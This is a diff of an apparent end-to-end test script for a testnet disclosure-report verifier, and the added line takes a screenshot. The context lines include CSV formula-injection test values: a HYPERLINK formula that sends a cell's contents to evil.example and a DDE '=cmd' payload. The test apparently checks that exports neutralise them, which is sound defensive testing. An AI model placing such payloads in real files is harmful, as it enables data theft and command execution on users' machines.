@@ -221,6 +221,7 @@ const N = 'latheon-testnet', CHAIN = { id: 60531373273, hex: '0xe17f374d9' }, E1
     const dupRep = JSON.parse(r.text); for (let i = 0; i < 3; i++) dupRep.items.push(JSON.parse(JSON.stringify(dupRep.items[0])));
     const v6 = await verify(JSON.stringify(dupRep)), t6 = await totalLine();
     rec('D18. A note repeated in the report: repeats marked, not counted, report refused', /repeats a note/.test(v6.status) && v6.rows.slice(6).every((c) => c[7] === 'repeat' && c[6] === '✗') && /Valid notes: 6 of 9/.test(t6) && /221 LTH/.test(t6), t6.slice(0, 70));
+    await aud.screenshot({ path: SHOTS + '/disclosure-report-repeat.png', fullPage: true });
     const inj = JSON.parse(rNo.text); inj.items.push(Object.assign(JSON.parse(JSON.stringify(inj.items[0])), { pool: '=HYPERLINK("https://evil.example/?x="&A1,"click")', commitment: "=cmd|' /C calc'!A0" }));
     const v7 = await verify(JSON.stringify(inj));
     const cells = (v7.csv || '').split('\n').flatMap((l) => l.split(',')).map((c) => c.replace(/^"/, ''));
